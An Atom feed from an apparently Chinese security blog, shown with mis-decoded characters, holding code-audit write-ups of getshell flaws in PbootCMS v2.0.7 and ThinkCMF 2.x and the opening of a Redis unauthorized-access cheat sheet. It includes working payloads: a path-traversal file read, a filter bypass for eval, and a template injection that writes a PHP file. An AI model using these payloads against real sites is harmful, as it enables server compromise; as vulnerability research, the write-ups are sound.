<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://chriskalix.github.io</id>
    <title>chriskali&apos;s blog</title>
    <updated>2020-06-14T05:25:48.106Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://chriskalix.github.io"/>
    <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
    <subtitle>Keep learning</subtitle>
    <logo>https://chriskalix.github.io/images/avatar.png</logo>
    <icon>https://chriskalix.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[Pbootcms v2.0.7 Getshellåˆ†æ]]></title>
        <id>https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/">
        </link>
        <updated>2020-06-14T04:50:43.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>å‰è¨€: ä¸Šä¸ªæœˆå›¢é˜Ÿä¸­çš„å¥¶æƒå®¡è®¡äº†PbootCMSï¼Œé‡Œé¢ä¸€äº›ç»†èŠ‚è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œäºæ˜¯è·Ÿé£(è·Ÿç€ä»–çš„æ–‡ç« )ï¼Œä¸€èµ·çœ‹ä¸€çœ‹ã€‚</p>
</blockquote>
<h2 id="åˆ†æ">åˆ†æ</h2>
<h3 id="åå°ä»»æ„æ–‡ä»¶è¯»å–">åå°ä»»æ„æ–‡ä»¶è¯»å–</h3>
<p><code>apps/admin/controller/system/UpgradeController.php</code>ä¸‹çš„updateå‡½æ•°ï¼Œä¸‹é¢ä¸ºè§¦å‘ç‚¹ç›¸å…³ä»£ç </p>
<pre><code class="language-php">public function update()
{
    if ($_POST) {
        if (! ! $list = post('list')) {
            $list = explode(',', $list);
            $backdir = date('YmdHis');
            // åˆ†ç¦»æ–‡ä»¶
            foreach ($list as $value) {
                // è¿‡æ»¤æ‰ç›¸å¯¹è·¯å¾„
                $value = preg_replace('/\.\.(\/|\\\)/', '', $value);
                if (stripos($value, '/script/') !== false) {
                    $sqls[] = $value;
                }
            ...
            // æ›´æ–°æ•°æ®åº“
            if (isset($sqls)) {
                $db = new DatabaseController();
                switch (get_db_type()) {
                    case 'sqlite':
                        copy(DOC_PATH . $this-&gt;config('database.dbname'), DOC_PATH . STATIC_DIR . '/backup/sql/' . date('YmdHis') . '_' . basename($this-&gt;config('database.dbname')));
                        break;
                    case 'mysql':
                        $db-&gt;backupDB();
                        break;
                }
                sort($sqls); // æ’åº
                foreach ($sqls as $value) {
                    $path = RUN_PATH . '/upgrade' . $value;
                    if (file_exists($path)) {
                        $sql = file_get_contents($path);
                        if (! $this-&gt;upsql($sql)) {
                            $this-&gt;log(&quot;æ•°æ®åº“ $value æ›´æ–°å¤±è´¥!&quot;);
                            json(0, &quot;æ•°æ®åº“&quot; . basename($value) . &quot; æ›´æ–°å¤±è´¥ï¼&quot;);
                        }
                    } else {
                        json(0, &quot;æ•°æ®åº“æ–‡ä»¶&quot; . basename($value) . &quot;ä¸å­˜åœ¨ï¼&quot;);
                    }
                }
            }
            ...
}
</code></pre>
<p>åœ¨æ³¨é‡Š<code>æ›´æ–°æ•°æ®åº“</code>ä¸‹ï¼Œå…³é”®å‡½æ•°<code>file_get_contents</code>ã€‚éå†<code>$sqls</code>å˜é‡ï¼Œè¯»å–æ–‡ä»¶ã€‚å…¶ä¸­<code>$sqls</code>å˜é‡ç”±POSTä¼ é€’ï¼Œéœ€è¦åŒ…å«<code>/script/</code>æ‰èƒ½å¤Ÿè¢«èµ‹å€¼<br>
è·Ÿè¿›çœ‹ä¸€ä¸‹<code>upsql($sql)</code>å‡½æ•°</p>
<pre><code class="language-php">private function upsql($sql)
{
    $sql = explode(';', $sql);
    $model = new Model();
    foreach ($sql as $value) {
        $value = trim($value);
        if ($value) {
            $model-&gt;amd($value);
        }
    }
    return true;
}
</code></pre>
<p><code>$sql</code>å‚æ•°ä¼ å…¥ï¼Œè°ƒç”¨Modelç±»ä¸‹çš„amdæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼Œåœ¨<code>/core/database/Sqlite.php</code>ä¸‹æ‰¾åˆ°å‡½æ•°ï¼Œå¦‚ä¸‹</p>
<pre><code class="language-php">public function amd($sql)
{
    $result = $this-&gt;query($sql, 'master');
    if ($result) {
        return $result;
    } else {
        return 0;
    }
}
</code></pre>
<p>è·Ÿè¿›çœ‹queryæ–¹æ³•</p>
<pre><code class="language-php">public function query($sql, $type = 'master')
{
    $time_s = microtime(true);
    if (! $this-&gt;master || ! $this-&gt;slave) {
        $cfg = ROOT_PATH . Config::get('database.dbname');
        $conn = $this-&gt;conn($cfg);
        $this-&gt;master = $conn;
        $this-&gt;slave = $conn;
    }
    switch ($type) {
        case 'master':
            if (! $this-&gt;begin) { // å­˜åœ¨å†™å…¥æ—¶è‡ªåŠ¨å¼€å¯æ˜¾å¼äº‹åŠ¡ï¼Œæé«˜å†™å…¥æ€§èƒ½
                $this-&gt;master-&gt;exec('begin;');
                $this-&gt;begin = true;
            }
            $result = $this-&gt;master-&gt;exec($sql) or $this-&gt;error($sql, 'master');
            break;
        case 'slave':
            $result = $this-&gt;slave-&gt;query($sql) or $this-&gt;error($sql, 'slave');
            break;
    }
    return $result;
}
</code></pre>
<p>è·Ÿè¿›erroræ–¹æ³•</p>
<pre><code class="language-php">protected function error($sql, $conn)
    {
        $err = 'é”™è¯¯ï¼š' . $this-&gt;$conn-&gt;lastErrorMsg() . 'ï¼Œ';
        if ($this-&gt;begin) { // å­˜åœ¨æ˜¾å¼å¼€å¯äº‹åŠ¡æ—¶è¿›è¡Œå›æ»š
            $this-&gt;master-&gt;exec('rollback;');
            $this-&gt;begin = false;
        }
        error('æ‰§è¡ŒSQLå‘ç”Ÿé”™è¯¯ï¼' . $err . 'è¯­å¥ï¼š' . $sql);
    }
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°erroræœ€ç»ˆä¼šè¢«å±•ç¤ºå‡ºæ¥ã€‚æœ€ç»ˆçš„payloadä¸º(åªæ”¯æŒwindowsä¸‹)</p>
<pre><code class="language-txt">URL: http://pbootcms/admin.php?p=/Upgrade/update
POST: list=/script/../../../config/database.php
</code></pre>
<p>è¿™è¾¹æœ‰ä¸€ä¸ªå°trickï¼Œwindowsä¸‹æ”¯æŒä¸å­˜åœ¨çš„è·¯å¾„ä¸Šè·³ï¼Œè€Œlinuxä¸‹æ˜¯æ”¯æŒçš„</p>
<p>å†å›å¤´çœ‹ä¸€ä¸‹ä¸Šé¢çš„åˆ¤æ–­æ¡ä»¶</p>
<pre><code class="language-php">if (stripos($value, '/script/') !== false)
</code></pre>
<p>å¯ä»¥çœ‹åˆ°åªè¦æœ‰<code>/script/</code>å‡ºç°å³å¯ï¼Œæ‰€ä»¥éœ€è¦åœ¨linuxä¸‹æ‰¾åˆ°ç›¸å…³ç›®å½•(å¥½åƒæ²¡æœ‰å›ºå®šçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯åœ¨windowsä¸‹æ¯”è¾ƒé€‚ç”¨)</p>
<h3 id="æ¨¡æ¿æ³¨å…¥">æ¨¡æ¿æ³¨å…¥</h3>
<p>è¿™è¾¹ç”¨åˆ°çš„trickåœ¨ä¹‹å‰çš„æ–‡ç« ä¸­æœ‰è¿‡æ•´ç†ï¼Œæ‰€ä»¥ç®€å•åœ°è¿‡ä¸€ä¸‹å…ˆã€‚åŒæ ·æƒ³æ³•å’Œæ€è·¯æ˜¯å…ˆè¿½æº¯æ•æ„Ÿå‡½æ•°ï¼Œå…¶ä¸­æ‰¾åˆ°evalåœ¨<code>apps/home/controller/ParseController.php</code>ä¸‹ï¼Œæ‰¾åˆ°å…·ä½“å‡½æ•°ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-php">public function parserIfLabel($content)
{
    $pattern = '/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
    $pattern2 = '/pboot:([0-9])+if/';
    if (preg_match_all($pattern, $content, $matches)) {
        $count = count($matches[0]);
        for ($i = 0; $i &lt; $count; $i ++) {
            $flag = '';
            $out_html = '';
            $danger = false;
            
            $white_fun = array(
                'date',
                'in_array',
                'explode',
                'implode'
            );
            
            // è¿˜åŸå¯èƒ½åŒ…å«çš„ä¿ç•™å†…å®¹ï¼Œé¿å…åˆ¤æ–­å¤±æ•ˆ
            $matches[1][$i] = $this-&gt;restorePreLabel($matches[1][$i]);
            
            // è§£ç æ¡ä»¶å­—ç¬¦ä¸²
            $matches[1][$i] = decode_string($matches[1][$i]);
            
            // å¸¦æœ‰å‡½æ•°çš„æ¡ä»¶è¯­å¥è¿›è¡Œå®‰å…¨æ ¡éªŒ
            if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)) {
                foreach ($matches2[1] as $value) {
                    if ((function_exists($value) || preg_match('/^eval$/i', $value)) &amp;&amp; ! in_array($value, $white_fun)) {
                        $danger = true;
                        break;
                    }
                }
            }
            
            // è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦ä¸²
            if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i', $matches[1][$i])) {
                $danger = true;
            }
            
            // å¦‚æœæœ‰å±é™©å‡½æ•°ï¼Œåˆ™ä¸è§£æè¯¥IF
            if ($danger) {
                continue;
            }
            
            eval('if(' . $matches[1][$i] . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}');
            ...
</code></pre>
<p>ä½œè€…æåˆ°äº†ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ºä¸Šä¼ å›¾ç‰‡é©¬å†é€šè¿‡<code>include()</code>å‡½æ•°åŒ…å«ï¼Œç¬¬äºŒå°±æ˜¯ä¸‹é¢æåˆ°çš„ç®€å•ä¸€äº›çš„é€šç”¨æ–¹æ³•ã€‚<br>
è·Ÿç€ä»£ç è¯»ä¸€ä¸‹ï¼Œå…¶å®å°±æ˜¯å°†ä¼ å…¥çš„æ¨¡æ¿è¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤æ‰ç‰¹æ®Šå­—ç¬¦ä¸²ã€‚åœ¨æˆ‘æ•´ç†çš„PHPåé—¨é‚£ä¸ªæ–‡ç« ä¸­æåˆ°äº†è¿™ä¸ªçš„ç»•è¿‡æ–¹æ³•ã€‚è¿™é‡Œçš„å…·ä½“åº”ç”¨å³ä¸ºä½¿ç”¨<code>chr%01(xxx)</code>è¿™ç§å½¢å¼(å³å‡½æ•°+æ§åˆ¶å­—ç¬¦+å‚æ•°)çš„å½¢å¼ç»•è¿‡ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Thinkcmf 2.x Getshellåˆ†æ]]></title>
        <id>https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/thinkcmf-2x-getshell-fen-xi/">
        </link>
        <updated>2020-06-14T04:40:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ">ç¯å¢ƒ</h2>
<p>windows<br>
phpstudy (php7.2.9)<br>
thinkcmf 2.2.2</p>
<h2 id="å…·ä½“åˆ†æ">å…·ä½“åˆ†æ</h2>
<p>é¦–å…ˆåœ¨<code>index.php</code>ä¸­å®šä¹‰äº†é¡¹ç›®è·¯å¾„ä¸º<code>application/</code><br>
åœ¨å…¥å£ç‚¹æ§åˆ¶å™¨<code>application/Portal/Controller/IndexController.class.php</code>ä¸­åªå®šä¹‰äº†ä¸€ä¸ªindexå‡½æ•°ï¼Œä½†æ˜¯å› ä¸ºç»§æ‰¿äº†<code>HomebaseController</code>ç±»ï¼Œå¯ä»¥è°ƒç”¨<code>HomebaseController</code>ä¸­å±æ€§ä¸ºpublicçš„å‡½æ•°<br>
è·Ÿè¿›<code>application/Common/Controller/HomebaseController.class.php</code>ï¼Œå…¶ä¸­éœ€è¦å…³æ³¨çš„æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ä¸ºdisplayä»¥åŠfetch</p>
<h3 id="getshellæ–¹æ³•1">Getshellæ–¹æ³•1</h3>
<p>é€šè¿‡displayæ–¹æ³•getshell</p>
<pre><code class="language-php">/**
    * åŠ è½½æ¨¡æ¿å’Œé¡µé¢è¾“å‡º å¯ä»¥è¿”å›è¾“å‡ºå†…å®¹
    * @access public
    * @param string $templateFile æ¨¡æ¿æ–‡ä»¶å
    * @param string $charset æ¨¡æ¿è¾“å‡ºå­—ç¬¦é›†
    * @param string $contentType è¾“å‡ºç±»å‹
    * @param string $content æ¨¡æ¿è¾“å‡ºå†…å®¹
    * @return mixed
    */
public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') {
    parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);
}
</code></pre>
<p><code>display</code>å‡½æ•°çš„æ³¨é‡Šä¸­ä¹ŸæåŠäº†ï¼Œç”¨äºåŠ è½½æ¨¡æ¿å’Œé¡µé¢è¾“å‡ºï¼Œè¿™é‡Œå­˜åœ¨çš„æ˜¯ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ã€‚<br>
è¿™é‡Œä½¿ç”¨aå‚æ•°æŒ‡å®šæ–¹æ³•ï¼Œä¼ å…¥<code>templateFile</code>å‚æ•°å¯ç›´æ¥å®Œæˆæœ¬åœ°åŒ…å«ï¼Œæœ¬åœ°æµ‹è¯•payloadä¸º<code>?a=display&amp;templateFile=README.md</code><br>
é‚£ä¹ˆå¦‚ä½•Getshellå‘¢ï¼ŸSp4ceå¸ˆå‚…çš„<a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw">æ–‡ç« </a>ä¸­ä½¿ç”¨çš„æ˜¯é€šè¿‡æŠ¥é”™çš„æ–¹æ³•ï¼Œå°†shellå†™å…¥å½“å¤©çš„æ—¥å¿—ï¼Œç„¶åé€šè¿‡åŒ…å«æ—¥å¿—æ‰§è¡Œå†™å…¥shellï¼Œç„¶åè¿æ¥shellå³å¯</p>
<p>è¿™è¾¹è®²çš„ç¨å¾®æµ…ä¸€ç‚¹ï¼Œåœ¨Getshellæ–¹æ³•2ä¸­è¡¥å…¨</p>
<h3 id="getshellæ–¹æ³•2">Getshellæ–¹æ³•2</h3>
<p>é€šè¿‡fetchæ–¹æ³•</p>
<pre><code class="language-php">/**
    * è·å–è¾“å‡ºé¡µé¢å†…å®¹
    * è°ƒç”¨å†…ç½®çš„æ¨¡æ¿å¼•æ“fetchæ–¹æ³•ï¼Œ
    * @access protected
    * @param string $templateFile æŒ‡å®šè¦è°ƒç”¨çš„æ¨¡æ¿æ–‡ä»¶
    * é»˜è®¤ä¸ºç©º ç”±ç³»ç»Ÿè‡ªåŠ¨å®šä½æ¨¡æ¿æ–‡ä»¶
    * @param string $content æ¨¡æ¿è¾“å‡ºå†…å®¹
    * @param string $prefix æ¨¡æ¿ç¼“å­˜å‰ç¼€*
    * @return string
    */
public function fetch($templateFile='',$content='',$prefix=''){
    $templateFile = empty($content)?$this-&gt;parseTemplate($templateFile):'';
    return parent::fetch($templateFile,$content,$prefix);
}
</code></pre>
<h4 id="æ·±å…¥æŸ¥çœ‹">æ·±å…¥æŸ¥çœ‹</h4>
<p>å¤§å¤šæ•°çš„æ–‡ç« ä¸€èˆ¬å°±æ˜¯å¼•ç”¨ä¸€ä¸‹<code>payload</code>æ‰‹åŠ¨å¤ç°ï¼Œä¹‹å‰æˆ‘ä¹Ÿæ²¡æœ‰çœ‹è¿‡thinkcmfè¿™ä¸ªæ¡†æ¶ï¼Œåªæ˜¯çœ‹åˆ«äººæ–‡ç« é‡Œè¯´çš„ï¼Œæ˜¯åŸºäº<code>thinkphp3.x</code>å°è£…çš„ï¼Œå†³å®šé™æ€çš„å»è·Ÿè¸ªä¸€ä¸‹ï¼Œæ·±å…¥ç†è§£ã€‚<br>
<code>parent::fetch</code>è°ƒç”¨çˆ¶ç±»çš„fetchï¼Œçœ‹ä¸‹å‡½æ•°å®šä¹‰<code>class HomebaseController extends AppframeController</code>ï¼Œåœ¨<code>AppframeController</code>ä¸‹å¹¶æ— fetchæ–¹æ³•ï¼Œç»§ç»­æŸ¥çœ‹ï¼Œå‘ç°å°±æ˜¯è°ƒç”¨äº†Thinkæ¨¡å—ä¸‹çš„Controller</p>
<pre><code class="language-php">namespace Common\Controller;
use Think\Controller;
class AppframeController extends Controller
</code></pre>
<p>æ‰€ä»¥fetchå‡½æ•°æœ¬è´¨ä¸Šå°±æ˜¯ä»Thinkphpçš„Controllerä¸­æŠ½è±¡å‡ºæ¥ï¼Œæ²¡æœ‰å…¶ä»–åŒºåˆ«ã€‚ç»§ç»­è·Ÿè¿›<code>simplewind/Core/Library/Think/Controller.class.php</code>ï¼Œå‡½æ•°å¦‚ä¸‹</p>
<pre><code class="language-php">protected function fetch($templateFile='',$content='',$prefix='') {
    return $this-&gt;view-&gt;fetch($templateFile,$content,$prefix);
}
</code></pre>
<p>è°ƒç”¨äº†viewä¸‹çš„fetchï¼Œæ‰¾åˆ°åœ¨<code>__construct()</code>ä¸­è¢«åˆå§‹åŒ–</p>
<pre><code class="language-php">public function __construct() {
    Hook::listen('action_begin',$this-&gt;config);
    //å®ä¾‹åŒ–è§†å›¾ç±»
    $this-&gt;view     = Think::instance('Think\View');
    //æ§åˆ¶å™¨åˆå§‹åŒ–
    if(method_exists($this,'_initialize'))
        $this-&gt;_initialize();
}
</code></pre>
<p>ç»§ç»­è·Ÿè¿›ï¼Œä¸º<code>simplewind/Core/Library/Think/View.class.php</code>ï¼Œç¬¬106è¡Œæ‰¾åˆ°fetchå‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<pre><code class="language-php">public function fetch($templateFile='',$content='',$prefix='') {
    if(empty($content)) {
        $templateFile   =   $this-&gt;parseTemplate($templateFile);
        // æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨ç›´æ¥è¿”å›
        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
    }else{
        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
    }
    // é¡µé¢ç¼“å­˜
    ob_start();
    ob_implicit_flush(0);
    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // ä½¿ç”¨PHPåŸç”Ÿæ¨¡æ¿
        $_content   =   $content;
        // æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡
        extract($this-&gt;tVar, EXTR_OVERWRITE);
        // ç›´æ¥è½½å…¥PHPæ¨¡æ¿
        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
    }else{
        // è§†å›¾è§£ææ ‡ç­¾
        $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
        Hook::listen('view_parse',$params);
    }
    // è·å–å¹¶æ¸…ç©ºç¼“å­˜
    $content = ob_get_clean();
    // å†…å®¹è¿‡æ»¤æ ‡ç­¾
    Hook::listen('view_filter',$content);
    // è¾“å‡ºæ¨¡æ¿æ–‡ä»¶
    return $content;
}
</code></pre>
<p><code>Getshellæ–¹æ³•1</code>çš„å‡½æ•°ä¹Ÿåœ¨è¿™ä¸ªæ–‡ä»¶ä¸‹ã€‚æ‰¾åˆ°çœŸæ­£çš„fetchå‡½æ•°ï¼Œåˆ†æä¸€ä¸‹ã€‚<br>
è¿™é‡Œæœ‰ä¸€äº›å‡½æ•°æ˜¯thinkphpä¸­è‡ªå¸¦çš„å‡ ä¸ªè¾ƒä¸ºé‡è¦çš„å‡½æ•°ï¼Œå¦‚fetchå‡½æ•°ä¸­çš„Eï¼ŒLï¼ŒCã€‚ç¿»é˜…äº†ä¸€ä¸‹èµ„æ–™ï¼Œåšä¸€ä¸ªç®€å•è¡¥å……ã€‚<br>
Cæ–¹æ³•ï¼šç®€å•çš„ç†è§£ä¸ºConfigï¼Œå³æ˜¯ç”¨äºè®¾ç½®ã€è·å–ã€ä»¥åŠä¿å­˜é…ç½®å‚æ•°çš„æ–¹æ³•ã€‚å…¶ä¸­çš„C('TMPL_ENGINE_TYPE')å³ä¸ºè·å–é…ç½®å€¼<br>
Eæ–¹æ³•ï¼šå³ä¸ºErrorï¼Œå…·ä½“å°±ä¸ºthrow new Think\Exception($msg, $code);<br>
Læ–¹æ³•ï¼šä»£è¡¨Languageï¼Œç”¨äºè·å¾—è¯­è¨€å˜é‡</p>
<p>å›åˆ°fetchå‡½æ•°ç»§ç»­è¿›è¡Œåˆ†æã€‚fetchå‡½æ•°ä¸‹è¾ƒä¸ºç®€å•ï¼Œåªæ˜¯ä¸¤ä¸ªifè¯­å¥åˆ¤æ–­ã€‚</p>
<p>ç¬¬ä¸€ä¸ªifè¯­å¥åˆ¤æ–­æ˜¯å¦ä¼ å…¥<code>$content</code>å‚æ•°ã€‚ç¬¬äºŒå¤„åˆ¤æ–­<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>ï¼Œä¸‹æ–­ç‚¹è°ƒè¯•åå¾—åˆ°<code>strtolower(C('TMPL_ENGINE_TYPE'))</code>çš„å€¼ä¸ºthinkï¼Œèµ°åˆ°elseåˆ†æ”¯ã€‚ä¸å¤ªäº†è§£çš„æ˜¯Hook::listenï¼Œæ•…å»æ£€ç´¢ã€‚æ–‡ç« ä¸­æåˆ°ï¼Œ<code>Hook::listen</code>é€šè¿‡éå†æŸä¸ªè¡Œä¸ºæ ‡ç­¾çš„æ‰€æœ‰è¡Œä¸ºï¼Œä¾æ¬¡å®ä¾‹åŒ–å¹¶ä¸”è°ƒç”¨runæ–¹æ³•ã€‚æ‰¾åˆ°æœ€çµ‚å°†<code>$param</code>å‚æ•°ä¼ å…¥<code>simplewind/Core/Library/Behavior/ParseTemplateBehavior.class.php</code>ï¼Œæ‰¾åˆ°å…¶ä¸­runæ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-php">public function run(&amp;$_data){
    $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
    $_content           =   empty($_data['content'])?$_data['file']:$_data['content'];
    $_data['prefix']    =   !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX');
    if('think'==$engine){ // é‡‡ç”¨Thinkæ¨¡æ¿å¼•æ“
        if((!empty($_data['content']) &amp;&amp; $this-&gt;checkContentCache($_data['content'],$_data['prefix'])) 
            ||  $this-&gt;checkCache($_data['file'],$_data['prefix'])) { // ç¼“å­˜æœ‰æ•ˆ
            //è½½å…¥æ¨¡ç‰ˆç¼“å­˜æ–‡ä»¶
            Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);
        }else{
            $tpl = Think::instance('Think\\Template');
            // ç¼–è¯‘å¹¶åŠ è½½æ¨¡æ¿æ–‡ä»¶
            $tpl-&gt;fetch($_content,$_data['var'],$_data['prefix']);
        }
    }else{
        // è°ƒç”¨ç¬¬ä¸‰æ–¹æ¨¡æ¿å¼•æ“è§£æå’Œè¾“å‡º
        if(strpos($engine,'\\')){
            $class  =   $engine;
        }else{
            $class   =  'Think\\Template\\Driver\\'.ucwords($engine);
        }
        if(class_exists($class)) {
            $tpl   =  new $class;
            $tpl-&gt;fetch($_content,$_data['var']);
        }else {  // ç±»æ²¡æœ‰å®šä¹‰
            E(L('_NOT_SUPPORT_').': ' . $class);
        }
    }
}
</code></pre>
<p>å³æ˜¯ä¸€ä¸ªåµŒå¥—åˆ¤æ–­ã€‚é¦–å…ˆ<code>$engine</code>ä¸ºthinkï¼Œèµ°è¿›ç¬¬ä¸€å±‚ifåˆ¤æ–­ä¸­ã€‚<code>$_data['content']</code>ä¸ä¸ºemptyï¼Œ<code>$this-&gt;checkContentCache</code>ä¸ºFalseï¼Œ<code>$this-&gt;checkCache</code>ä¹Ÿä¸ºfalseï¼Œèµ°åˆ°elseåˆ†æ”¯ã€‚(è¿™è¾¹å°±ä¸å†è¯¦ç»†è·Ÿè¿›å…·ä½“å‡½æ•°ï¼Œä¸ç„¶å¤ªé•¿äº†)ã€‚ä¹‹åæ‰§è¡Œä¸¤ä¸ªæ“ä½œï¼Œ<code>Think::instance('Think\\Template')ä»¥åŠ$tpl-&gt;fetch($_content,$_data['var'],$_data['prefix'])</code>ã€‚</p>
<p>è·Ÿè¿›fetchï¼Œå…·ä½“ä¸º</p>
<pre><code class="language-php">public function fetch($templateFile,$templateVar,$prefix='') {
    $this-&gt;tVar         =   $templateVar;
    $templateCacheFile  =   $this-&gt;loadTemplate($templateFile,$prefix);
    Storage::load($templateCacheFile,$this-&gt;tVar,null,'tpl');
}
</code></pre>
<p>åœ¨<code>$this-&gt;loadTemplate</code>çš„æ—¶å€™å†™å…¥äº†ç¼“å­˜æ¨¡æ¿æ–‡ä»¶ã€‚</p>
<p>è°ƒç”¨<code>Storage::load</code>ï¼Œå¦‚ä¸‹</p>
<pre><code class="language-php">public function load($_filename,$vars=null){
    if(!is_null($vars)){
        extract($vars, EXTR_OVERWRITE);
    }
    include $_filename;
}
</code></pre>
<p>å†é€šè¿‡includeåŒ…å«è¿›æ¥ï¼Œæ‰§è¡Œphpä»£ç ã€‚ä»¥ä¸Šéƒ½æ˜¯è·Ÿç€æ–‡ç« ä¸­çš„payloadä¸€æ­¥æ­¥è°ƒè¯•è·Ÿè¿›ã€‚å…¶å®åˆ°thinkcmfæŠ½è±¡çš„fetchä¹‹åçš„ï¼Œéƒ½ç®—æ˜¯Thinkphpçš„é—®é¢˜å§...</p>
<h4 id="payload">payload</h4>
<p>åœ¨indexè·¯å¾„ä¸‹å†™å…¥<code>phpinfo()</code>çš„payloadä¸º</p>
<pre><code class="language-txt">?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('test.php','&lt;?php phpinfo(); ?&gt;')&lt;/php&gt;
</code></pre>
<h2 id="çŸ¥è¯†ç‚¹å›°æƒ‘ç‚¹">çŸ¥è¯†ç‚¹&amp;å›°æƒ‘ç‚¹</h2>
<p>å¾ˆå¤šæ–‡ç« ä¸­éƒ½æåŠåˆ°äº†thinkphpä¸­çš„g\m\aï¼Œå³åˆ†ç»„\æ§åˆ¶å™¨\æ–¹æ³•ã€‚æ–‡ä¸­æåŠåˆ°çš„æ–¹æ³•å‡ä¸ºé€šè¿‡ç›´æ¥ä½¿ç”¨æ–¹æ³•å»è°ƒç”¨çˆ¶ç±»çš„publicå‡½æ•°ã€‚å›°æƒ‘çš„åœ°æ–¹ä¸ºå®˜æ–¹æ–‡æ¡£ä¸­æåŠåˆ°çš„ï¼Œä¹Ÿæœ‰m\c\aè¿™ä¸ªæ¦‚å¿µï¼Œå³module\controller\application(æ€»è§‰å¾—å¥½åƒæ˜¯ä¸€æ ·çš„ï¼Œæš‚æ—¶å…ˆåŸ‹ä¸ªå‘ï¼Œåç»­æˆ‘å†å»ç¿»é˜…æ–‡æ¡£)</p>
<h2 id="ä¿®å¤">ä¿®å¤</h2>
<p>å°†displayå’Œfetchä¸¤ä¸ªå‡½æ•°éƒ½æ”¹ä¸ºprotected</p>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<p><a href="https://xz.aliyun.com/t/6626#toc-5">å…ˆçŸ¥æ–‡ç« </a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Redisæ”»å‡»å¤‡å¿˜å½•]]></title>
        <id>https://chriskalix.github.io/post/redis-gong-ji-bei-wang-lu/</id>
        <link href="https://chriskalix.github.io/post/redis-gong-ji-bei-wang-lu/">
        </link>
        <updated>2020-06-14T04:28:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨">REDISæœªæˆæƒè®¿é—®çš„åˆ©ç”¨</h2>
<blockquote>
<p>ç›®å‰æ¯”è¾ƒå…¨çš„<a href="https://paper.seebug.org/975/">æ–‡ç« </a></p>
</blockquote>
<h3 id="linuxä¸‹çš„åˆ©ç”¨">Linuxä¸‹çš„åˆ©ç”¨</h3>
<pre><code class="language-txt">åœ¨linuxä¸‹çš„åˆ©ç”¨ä¸»è¦æœ‰ä¸‰ç§

1. å†™å…¥sshå…¬é’¥
2. å†™crontab
3. å†™webshell

ç”¨redis-cli

[*] æ³¨æ„:redisæ•æ„Ÿï¼Œæ³¨æ„å®¢æˆ·ç¯å¢ƒï¼Œä¸è¦è¦†ç›–å®¢æˆ·çš„å˜é‡æ•°æ®ï¼Œæ›´ä¸è¦æ¸…ç©ºï¼Œå°å¿ƒæ“ä½œ
</code></pre>
<h4 id="1-å†™sshå…¬é’¥">1. å†™sshå…¬é’¥</h4>
<pre><code class="language-txt">æ¡ä»¶ï¼š

1. ç›®æ ‡å¼€å¯sshï¼Œä¸”å…è®¸å¯†é’¥ç™»å½•
2. Redisä½¿ç”¨rootè´¦å·å¯åŠ¨

æ­¥éª¤å¦‚ä¸‹ï¼š

1. `ssh-keygen -t rsa`åœ¨æœ¬åœ°ç”Ÿæˆsshå¯†é’¥å¯¹ï¼Œæœ¬æœºæ˜¯rootï¼Œæ‰€ä»¥ç”Ÿæˆåœ¨`/root/.ssh/`ç›®å½•ä¸‹ï¼Œid_rsaä¸ºç§é’¥ï¼Œid_rsa.pubä¸ºå…¬é’¥ã€‚
